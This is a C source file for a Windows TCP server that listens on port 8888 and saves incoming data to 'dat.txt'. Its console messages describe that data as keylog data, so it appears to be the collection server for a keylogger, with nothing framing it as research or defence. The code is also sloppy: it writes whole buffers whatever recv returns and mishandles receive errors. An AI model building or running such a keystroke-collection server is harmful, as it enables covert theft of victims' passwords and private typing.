#pragma comment(lib, "ws2_32")
#include <stdio.h>
#include <WinSock2.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

#define BUF_SIZE 30
#define DEF_PORT 8888
#define DEF_FILE_NAME "dat.txt"
void error_handling(const char* message);
int main() {
	printf("[+] Server Start\n");
	WSADATA wsa;
	SOCKET hservSock;
	SOCKET hclntSock;
	SOCKADDR_IN servAddr;
	SOCKADDR_IN clntAddr;
	int clntAddr_len;
	int recv_len;
	char buf[BUF_SIZE];
	WSAStartup(MAKEWORD(2, 2), &wsa);
	hservSock = socket(PF_INET, SOCK_STREAM, 0);

	if (hservSock == INVALID_SOCKET)
		error_handling("[-] Error: socket() fail");

	memset(&servAddr, 0, sizeof(servAddr));

	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	servAddr.sin_port = htons(DEF_PORT);

	if (bind(hservSock, (SOCKADDR*)&servAddr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		error_handling("[-] Error: bind() fail");

	if (listen(hservSock, 1) == SOCKET_ERROR)
		error_handling("[-] Error: listen() fail");

	int count = 1;

	while (1) {
		if (count)
			printf("[*] Waiting Client\n");
		clntAddr_len = sizeof(clntAddr);

		hclntSock = accept(hservSock, (SOCKADDR*)&clntAddr, &clntAddr_len);
		if (hclntSock == INVALID_SOCKET)
			error_handling("[-] Error : accept() fail");

		printf("[+] Connected client\n");

		FILE *fp = NULL;
		fp = fopen(DEF_FILE_NAME, "wb");

		if (fp == NULL)
			error_handling("[-] Error : fopen() fail");
		printf("[+] Reciving data of keylog...\n");
		while ((recv_len = recv(hclntSock, buf, BUF_SIZE, 0)) != 0) {
			fwrite(buf, BUF_SIZE, 1, fp);
		}
		fclose(fp);

		printf("[+] Finish reciving data\n\n");

	}
	closesocket(hservSock);
	WSACleanup();

	return 0;

}
void error_handling(const char* message) {
	fputs(message, stderr);
	fputc('\n', stderr);
	exit(1);
}